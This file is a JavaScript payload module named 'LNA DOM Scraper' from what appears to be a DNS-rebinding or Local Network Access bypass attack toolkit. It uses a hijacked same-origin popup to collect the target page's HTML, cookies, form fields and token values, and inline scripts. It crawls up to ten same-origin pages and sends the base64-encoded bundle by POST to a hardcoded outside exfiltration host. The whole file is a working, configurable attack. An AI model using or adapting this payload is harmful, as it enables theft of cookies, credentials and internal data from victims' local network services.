/**
 * LNA DOM Scraper payload.
 *
 * Purpose-built for the LNA navigation bypass (lna-bypass.html). Unlike
 * the AWS Metadata Exfil payload which gets a single response body, this
 * payload exploits the fact that the navigation bypass gives us a live
 * same-origin window reference to the target. That means:
 *
 *   - Full DOM access (not just text — forms, scripts, links, cookies)
 *   - We can navigate the popup to follow links and scrape multiple pages
 *   - We can read response headers via meta tags and inline scripts
 *   - We can extract structured data (forms, inputs, tokens, endpoints)
 *
 * The payload scrapes the initial page, extracts interesting targets
 * (links, forms, API endpoints), optionally crawls them, and exfils
 * the collected data as a structured JSON bundle.
 *
 * EDIT THIS FILE for: exfil destination, crawl depth, target selectors.
 */

const LnaDomScraper = (() => {
    const EXFILTRATION_URL = "https://t7grsprm.c5.rs";
    const MAX_CRAWL_DEPTH = 2;
    const MAX_PAGES = 10;
    const NAV_DELAY = 2000;

    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    function extractPageData(doc, url) {
        const data = {
            url: url,
            title: doc.title || '',
            body: doc.documentElement.outerHTML,
            meta: {},
            links: [],
            forms: [],
            scripts: [],
            inputs: [],
            cookies: '',
        };

        try { data.cookies = doc.cookie; } catch (_) {}

        for (const m of doc.querySelectorAll('meta')) {
            const name = m.getAttribute('name') || m.getAttribute('property') || m.getAttribute('http-equiv');
            if (name) data.meta[name] = m.getAttribute('content') || '';
        }

        for (const a of doc.querySelectorAll('a[href]')) {
            const href = a.getAttribute('href');
            if (href && !href.startsWith('javascript:') && !href.startsWith('#')) {
                data.links.push(href);
            }
        }

        for (const f of doc.querySelectorAll('form')) {
            const formData = {
                action: f.getAttribute('action') || '',
                method: f.getAttribute('method') || 'GET',
                inputs: [],
            };
            for (const inp of f.querySelectorAll('input')) {
                formData.inputs.push({
                    name: inp.getAttribute('name') || '',
                    type: inp.getAttribute('type') || 'text',
                    value: inp.value || inp.getAttribute('value') || '',
                });
            }
            data.forms.push(formData);
        }

        for (const s of doc.querySelectorAll('script:not([src])')) {
            const text = s.textContent.trim();
            if (text.length > 0 && text.length < 10000) {
                data.scripts.push(text);
            }
        }

        for (const inp of doc.querySelectorAll('input, textarea, select')) {
            const name = inp.getAttribute('name') || inp.getAttribute('id') || '';
            if (name) {
                data.inputs.push({ name: name, value: inp.value || '' });
            }
        }

        return data;
    }

    function resolveUrl(base, href) {
        try {
            return new URL(href, base).href;
        } catch (_) {
            return null;
        }
    }

    function exfil(bundle) {
        const json = JSON.stringify(bundle);
        const utf8 = new TextEncoder().encode(json);
        const base64Body = btoa(String.fromCharCode(...utf8));

        sooFetch(EXFILTRATION_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
            body: base64Body,
        });
    }

    async function crawlFromPopup(popup, bundle, initialDoc) {
        const visited = new Set([window.location.pathname]);
        const toVisit = [];

        const initialLinks = initialDoc.querySelectorAll('a[href]');
        for (const a of initialLinks) {
            const href = a.getAttribute('href');
            const resolved = resolveUrl(window.location.href, href);
            if (!resolved) continue;
            try {
                const u = new URL(resolved);
                if (u.origin === window.location.origin && !visited.has(u.pathname)) {
                    toVisit.push(u.pathname);
                    visited.add(u.pathname);
                }
            } catch (_) {}
        }

        console.log('[scraper] found ' + toVisit.length + ' same-origin links to crawl');

        let crawled = 0;
        for (const path of toVisit) {
            if (crawled >= MAX_PAGES) break;

            try {
                popup.location = path;
                await wait(NAV_DELAY);

                const doc = popup.document;
                const pageData = extractPageData(doc, popup.location.href);
                bundle.pages.push(pageData);
                crawled++;
                console.log('[scraper] crawled ' + path + ' (' + crawled + '/' + MAX_PAGES + ')');

                for (const a of doc.querySelectorAll('a[href]')) {
                    const href = a.getAttribute('href');
                    const resolved = resolveUrl(popup.location.href, href);
                    if (!resolved) continue;
                    try {
                        const u = new URL(resolved);
                        if (u.origin === window.location.origin && !visited.has(u.pathname)) {
                            toVisit.push(u.pathname);
                            visited.add(u.pathname);
                        }
                    } catch (_) {}
                }

                if (crawled % 3 === 0) exfil(bundle);
            } catch (e) {
                console.log('[scraper] failed to crawl ' + path + ': ' + e);
            }
        }

        exfil(bundle);
        console.log('[scraper] done. ' + bundle.pages.length + ' pages total.');
    }

    return {
        attack(headers, cookie, body, wsProxyPort) {
            console.log('[scraper] initial page: ' + body.length + ' bytes');
            if (cookie) console.log('[scraper] cookie: ' + cookie);

            const parser = new DOMParser();
            const doc = parser.parseFromString(body, 'text/html');

            const bundle = {
                timestamp: new Date().toISOString(),
                origin: window.location.origin,
                pages: [extractPageData(doc, window.location.href)],
            };

            exfil(bundle);
            console.log('[scraper] initial page exfilled');

            if (window.__lnaPopup && MAX_CRAWL_DEPTH > 0) {
                crawlFromPopup(window.__lnaPopup, bundle, doc);
            }
        },

        isService: async () => false,
    };
})();

Registry["LNA DOM Scraper"] = LnaDomScraper;
